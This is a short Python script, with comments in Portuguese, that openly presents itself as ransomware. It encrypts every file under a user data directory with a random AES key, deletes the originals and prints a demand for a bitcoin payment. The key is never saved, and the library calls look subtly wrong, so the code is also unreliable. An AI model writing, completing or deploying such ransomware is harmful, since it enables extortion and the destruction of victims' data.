import os
import pyAesCrypt
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# Criando a chave de criptografia
key = get_random_bytes(16)

# Definindo o diretório onde os arquivos serão criptografados
diretorio = "/home/user/data"

# Criptografando todos os arquivos do diretório
for root, dirs, files in os.walk(diretorio):
    for file in files:
        # Definindo o caminho do arquivo
        file_path = os.path.join(root, file)
        # Criptografando o arquivo usando AES
        aes_cipher = AES.new(key, AES.MODE_EAX)
        pyAesCrypt.encryptFile(file_path, file_path + ".encrypted", key, aes_cipher)
        # Removendo o arquivo original
        os.remove(file_path)
        # Renomeando o arquivo criptografado
        os.rename(file_path + ".encrypted", file_path)

# Exibindo a mensagem de aviso
print("Seus arquivos foram criptografados usando o ransomware em Python!")
print("Você precisa pagar uma quantia em bitcoins para obter a chave de descriptografia.")
